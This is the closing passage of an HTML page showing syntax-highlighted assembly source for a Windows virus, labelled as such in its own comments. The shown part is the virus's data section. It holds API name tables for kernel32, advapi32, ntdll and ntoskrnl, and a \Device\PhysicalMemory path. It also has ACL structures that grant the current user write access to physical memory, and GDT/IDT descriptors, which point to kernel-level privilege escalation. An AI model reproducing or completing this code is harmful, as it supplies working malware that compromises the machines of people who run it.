                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">NTDLLApiCRC32s</span><span class="sc4">:</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc12">'NtOp'</span><span class="sc4">+</span><span class="sc12">'enSe'</span><span class="sc4">+</span><span class="sc12">'ctio'</span><span class="sc4">+</span><span class="sc12">'n'</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc12">'NtMa'</span><span class="sc4">+</span><span class="sc12">'pVie'</span><span class="sc4">+</span><span class="sc12">'wOfS'</span><span class="sc4">+</span><span class="sc12">'ecti'</span><span class="sc4">+</span><span class="sc12">'on'</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc12">'NtUn'</span><span class="sc4">+</span><span class="sc12">'mapV'</span><span class="sc4">+</span><span class="sc12">'iewO'</span><span class="sc4">+</span><span class="sc12">'fSec'</span><span class="sc4">+</span><span class="sc12">'tion'</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">NTOSKRNLApiCRC32s</span><span class="sc4">:</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc12">'ExAl'</span><span class="sc4">+</span><span class="sc12">'loca'</span><span class="sc4">+</span><span class="sc12">'tePo'</span><span class="sc4">+</span><span class="sc12">'olWi'</span><span class="sc4">+</span><span class="sc12">'thTa'</span><span class="sc4">+</span><span class="sc12">'g'</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc12">'ExFr'</span><span class="sc4">+</span><span class="sc12">'eePo'</span><span class="sc4">+</span><span class="sc12">'ol'</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc12">'KeSe'</span><span class="sc4">+</span><span class="sc12">'rvic'</span><span class="sc4">+</span><span class="sc12">'eDes'</span><span class="sc4">+</span><span class="sc12">'crip'</span><span class="sc4">+</span><span class="sc12">'torT'</span><span class="sc4">+</span><span class="sc12">'able'</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc12">'NtOp'</span><span class="sc4">+</span><span class="sc12">'enFi'</span><span class="sc4">+</span><span class="sc12">'le'</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc12">'ZwOp'</span><span class="sc4">+</span><span class="sc12">'enFi'</span><span class="sc4">+</span><span class="sc12">'le'</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc12">'ZwCl'</span><span class="sc4">+</span><span class="sc12">'ose'</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc12">'ZwQu'</span><span class="sc4">+</span><span class="sc12">'eryI'</span><span class="sc4">+</span><span class="sc12">'nfor'</span><span class="sc4">+</span><span class="sc12">'mati'</span><span class="sc4">+</span><span class="sc12">'onFi'</span><span class="sc4">+</span><span class="sc12">'le'</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc12">'ZwRe'</span><span class="sc4">+</span><span class="sc12">'adFi'</span><span class="sc4">+</span><span class="sc12">'le'</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc12">'ZwWr'</span><span class="sc4">+</span><span class="sc12">'iteF'</span><span class="sc4">+</span><span class="sc12">'ile'</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc9">align</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc4">,</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; Just to align virus size to 512 byte boundary ;D</span><span class="sc0">
</span><span class="sc5">Virus_size_physical</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">

</span><span class="sc1">; Resolved API Addresses</span><span class="sc0">

</span><span class="sc5">KERNEL32ApiCalls</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">SetThreadPriority</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">LocalFree</span><span class="sc0">                       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CloseHandle</span><span class="sc0">                     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">VirtualLock</span><span class="sc0">                     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">VirtualUnlock</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Sleep</span><span class="sc0">                           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">LoadLibraryA</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">ADVAPI32ApiCalls</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">GetSecurityInfo</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SetSecurityInfo</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SetEntriesInAclA</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">NTDLLApiCalls</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">NtOpenSection</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">NtMapViewOfSection</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">NtUnmapViewOfSection</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">NTOSKRNLApiCalls</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">ExAllocatePoolWithTag</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ExFreePool</span><span class="sc0">                      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">KeServiceDescriptorTable</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">NtOpenFile</span><span class="sc0">                      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ZwOpenFile</span><span class="sc0">                      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ZwClose</span><span class="sc0">                         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ZwQueryInformationFile</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ZwReadFile</span><span class="sc0">                      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ZwWriteFile</span><span class="sc0">                     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;;; TYPE DECLARATIONS FOR USED STRUCTS</span><span class="sc0">

</span><span class="sc5">xstruc</span><span class="sc0"> </span><span class="sc5">UNICODE_STRING</span><span class="sc0">
    </span><span class="sc5">xitemw</span><span class="sc0"> </span><span class="sc9">Length</span><span class="sc0">
    </span><span class="sc5">xitemw</span><span class="sc0"> </span><span class="sc5">MaximumLength</span><span class="sc0">
    </span><span class="sc5">xitemd</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc0">
</span><span class="sc5">xends</span><span class="sc0">

</span><span class="sc5">xstruc</span><span class="sc0"> </span><span class="sc5">OBJECT_ATTRIBUTES</span><span class="sc0">
        </span><span class="sc5">xitemd</span><span class="sc0"> </span><span class="sc9">Length</span><span class="sc0">
    </span><span class="sc5">xitemd</span><span class="sc0"> </span><span class="sc5">RootDirectory</span><span class="sc0">
    </span><span class="sc5">xitemd</span><span class="sc0"> </span><span class="sc5">ObjectName</span><span class="sc0">
    </span><span class="sc5">xitemd</span><span class="sc0"> </span><span class="sc5">Attributes</span><span class="sc0">
    </span><span class="sc5">xitemd</span><span class="sc0"> </span><span class="sc5">SecurityDescriptor</span><span class="sc0">
    </span><span class="sc5">xitemd</span><span class="sc0"> </span><span class="sc5">SecurityQualityOfService</span><span class="sc0">
</span><span class="sc5">xends</span><span class="sc0">

</span><span class="sc9">%macro</span><span class="sc0"> </span><span class="sc5">TRUSTEE</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">xstruc</span><span class="sc0"> </span><span class="sc10">%1</span><span class="sc4">,%</span><span class="sc2">2</span><span class="sc4">,%</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc5">xitemd</span><span class="sc0"> </span><span class="sc5">pMultipleTrustee</span><span class="sc0">
    </span><span class="sc5">xitemd</span><span class="sc0"> </span><span class="sc5">MultipleTrusteeOperation</span><span class="sc0">
    </span><span class="sc5">xitemd</span><span class="sc0"> </span><span class="sc5">TrusteeForm</span><span class="sc0">
    </span><span class="sc5">xitemd</span><span class="sc0"> </span><span class="sc5">TrusteeType</span><span class="sc0">
    </span><span class="sc5">xitemd</span><span class="sc0"> </span><span class="sc5">ptstrName</span><span class="sc0">
</span><span class="sc5">xends</span><span class="sc0">
</span><span class="sc9">%endmacro</span><span class="sc0">
</span><span class="sc5">TRUSTEE</span><span class="sc0"> </span><span class="sc5">TRUSTEE</span><span class="sc0">

</span><span class="sc5">xstruc</span><span class="sc0"> </span><span class="sc5">EXPLICIT_ACCESS</span><span class="sc0">
    </span><span class="sc5">xitemd</span><span class="sc0"> </span><span class="sc5">grfAccessPermissions</span><span class="sc0">
    </span><span class="sc5">xitemd</span><span class="sc0"> </span><span class="sc5">grfAccessMode</span><span class="sc0">
    </span><span class="sc5">xitemd</span><span class="sc0"> </span><span class="sc5">grfInheritance</span><span class="sc0">
    </span><span class="sc5">TRUSTEE</span><span class="sc0"> </span><span class="sc5">Trustee</span><span class="sc0">
</span><span class="sc5">xends</span><span class="sc0">

</span><span class="sc5">xstruc</span><span class="sc0"> </span><span class="sc5">GDTR</span><span class="sc0">
        </span><span class="sc5">xitemw</span><span class="sc0"> </span><span class="sc5">Limit</span><span class="sc0">
        </span><span class="sc5">xitemd</span><span class="sc0"> </span><span class="sc5">Base</span><span class="sc0">
</span><span class="sc5">xends</span><span class="sc0">

</span><span class="sc5">xstruc</span><span class="sc0"> </span><span class="sc5">IDTR</span><span class="sc0">
        </span><span class="sc5">xitemw</span><span class="sc0"> </span><span class="sc5">Limit</span><span class="sc0">
        </span><span class="sc5">xitemd</span><span class="sc0"> </span><span class="sc5">Base</span><span class="sc0">
</span><span class="sc5">xends</span><span class="sc0">

</span><span class="sc5">xstruc</span><span class="sc0"> </span><span class="sc5">FILE_STANDARD_INFORMATION</span><span class="sc0">
        </span><span class="sc5">xitemq</span><span class="sc0"> </span><span class="sc5">AllocationSize</span><span class="sc0">
        </span><span class="sc5">xitemq</span><span class="sc0"> </span><span class="sc5">EndOfFile</span><span class="sc0">
        </span><span class="sc5">xitemd</span><span class="sc0"> </span><span class="sc5">NumberOfLinks</span><span class="sc0">
        </span><span class="sc5">xitemd</span><span class="sc0"> </span><span class="sc5">DeletePending</span><span class="sc0">
        </span><span class="sc5">xitemd</span><span class="sc0"> </span><span class="sc5">Directory</span><span class="sc0">
</span><span class="sc5">xends</span><span class="sc0">

</span><span class="sc1">;;;</span><span class="sc0">

</span><span class="sc1">;;; DATA SPACE DECLARATIONS</span><span class="sc0">

</span><span class="sc1">; Some of theese strucs need to be on a DWORD boundary!</span><span class="sc0">
</span><span class="sc1">; So EBP should also de aligned to DWORD on runtime!</span><span class="sc0">
</span><span class="sc1">; Also, for size optimization, theese next 3 structs + 2 strings are filled dinamically on runtime and need to be one after another</span><span class="sc0">

</span><span class="sc5">MyOBJECT_ATTRIBUTES</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">xistruc</span><span class="sc0"> </span><span class="sc5">OBJECT_ATTRIBUTES</span><span class="sc0">
        </span><span class="sc1">;xat Length,dd OBJECT_ATTRIBUTES_size</span><span class="sc0">
        </span><span class="sc1">;xat RootDirectory,dd 0</span><span class="sc0">
        </span><span class="sc1">;xat ObjectName,dd MyUNICODE_STRING &gt; this will take effective address [ebp+MyUNICODE_STRING]</span><span class="sc0">
        </span><span class="sc1">;xat Attributes,dd OBJ_CASE_INSENSITIVE</span><span class="sc0">
        </span><span class="sc1">;xat SecurityDescriptor,dd NULL</span><span class="sc0">
        </span><span class="sc1">;xat SecurityQualityOfService,dd NULL</span><span class="sc0">
</span><span class="sc5">xiends</span><span class="sc0">

</span><span class="sc5">MyUNICODE_STRING</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">xistruc</span><span class="sc0"> </span><span class="sc5">UNICODE_STRING</span><span class="sc0">
        </span><span class="sc1">;xat Length,dw DevicePhysicalMemory_size</span><span class="sc0">
        </span><span class="sc1">;xat MaximumLength,dw DevicePhysicalMemory_size</span><span class="sc0">
        </span><span class="sc1">;xat Buffer,dd DevicePhysicalMemory &gt; this will take effective address [ebp+DevicePhysicalMemory]</span><span class="sc0">
</span><span class="sc5">xiends</span><span class="sc0">

</span><span class="sc5">MyEXPLICIT_ACCESS</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">xistruc</span><span class="sc0"> </span><span class="sc5">EXPLICIT_ACCESS</span><span class="sc0">
        </span><span class="sc1">;xat grfAccessPermissions,dd SECTION_MAP_WRITE</span><span class="sc0">
        </span><span class="sc1">;xat grfAccessMode,dd GRANT_ACCESS</span><span class="sc0">
        </span><span class="sc1">;xat grfInheritance,dd NO_INHERITANCE</span><span class="sc0">
        </span><span class="sc1">;xat Trustee.pMultipleTrustee,dd NULL</span><span class="sc0">
        </span><span class="sc1">;xat Trustee.MultipleTrusteeOperation,dd NO_MULTIPLE_TRUSTEE</span><span class="sc0">
        </span><span class="sc1">;xat Trustee.TrusteeForm,dd TRUSTEE_IS_NAME</span><span class="sc0">
        </span><span class="sc1">;xat Trustee.TrusteeType,dd TRUSTEE_IS_USER</span><span class="sc0">
        </span><span class="sc1">;xat Trustee.ptstrName,dd CURRENTUSER &gt; this will take effective address [ebp+CURRENTUSER]</span><span class="sc0">
</span><span class="sc5">xiends</span><span class="sc0">

</span><span class="sc1">;;;</span><span class="sc0">

</span><span class="sc9">align</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">,</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; Some of theese strucs need to be on a DWORD boundary!</span><span class="sc0">
                </span><span class="sc1">; So EBP should also de aligned to DWORD on runtime!</span><span class="sc0">
                </span><span class="sc1">; NOTE: This string will be dinamically replaced in runtime so its</span><span class="sc0">
                </span><span class="sc1">; purpose is just to reserve a space and to be more understandable</span><span class="sc0">
</span><span class="sc5">CURRENTUSER</span><span class="sc0">                     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CURRENT_USER'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc9">align</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">,</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; Some of theese strucs need to be on a DWORD boundary!</span><span class="sc0">
                </span><span class="sc1">; So EBP should also de aligned to DWORD on runtime!</span><span class="sc0">
                </span><span class="sc1">; NOTE: This string will be dinamically replaced in runtime so its</span><span class="sc0">
                </span><span class="sc1">; purpose is just to reserve a space and to be more understandable</span><span class="sc0">
</span><span class="sc5">DevicePhysicalMemory</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'\',0,'</span><span class="sc5">D</span><span class="sc12">',0,'</span><span class="sc5">e</span><span class="sc12">',0,'</span><span class="sc5">v</span><span class="sc12">',0,'</span><span class="sc5">i</span><span class="sc12">',0,'</span><span class="sc10">c</span><span class="sc12">',0,'</span><span class="sc5">e</span><span class="sc12">',0,'</span><span class="sc0">\</span><span class="sc12">',0,'</span><span class="sc5">P</span><span class="sc12">',0,'</span><span class="sc5">h</span><span class="sc12">',0,'</span><span class="sc5">y</span><span class="sc12">',0,'</span><span class="sc5">s</span><span class="sc12">',0,'</span><span class="sc5">i</span><span class="sc12">',0,'</span><span class="sc10">c</span><span class="sc12">',0,'</span><span class="sc5">a</span><span class="sc12">',0,'</span><span class="sc5">l</span><span class="sc12">',0,'</span><span class="sc5">M</span><span class="sc12">',0,'</span><span class="sc5">e</span><span class="sc12">',0,'</span><span class="sc5">m</span><span class="sc12">',0,'</span><span class="sc5">o</span><span class="sc12">',0,'</span><span class="sc5">r</span><span class="sc12">',0,'</span><span class="sc5">y</span><span class="sc13">',0
</span><span class="sc5">DevicePhysicalMemory_size</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">DevicePhysicalMemory</span><span class="sc0">

                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; needed just cos the loop that fills previous DevicePhysicalMemory fills in a WORD more that the needed ( loop optimization reason )</span><span class="sc0">
</span><span class="sc1">;;;</span><span class="sc0">

</span><span class="sc5">MyGDTR</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">xistruc</span><span class="sc0"> </span><span class="sc5">GDTR</span><span class="sc0">
</span><span class="sc5">xiends</span><span class="sc0">

</span><span class="sc5">MyIDTR</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">xistruc</span><span class="sc0"> </span><span class="sc5">IDTR</span><span class="sc0">
</span><span class="sc5">xiends</span><span class="sc0">

</span><span class="sc5">MyhSection</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">pDacl</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">pSecurityDescriptor</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">pNewAcl</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">KERNEL32Base</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc9">align</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc4">,</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; Just to align virus virtual size to 256 byte boundary ;D</span><span class="sc0">
</span><span class="sc5">Virus_size_memory</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">

</span><span class="sc1">;--8&lt;-------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">; * * *  END OF DOCUMENT * * *</span><span class="sc0">
</span></div></body>
</html>
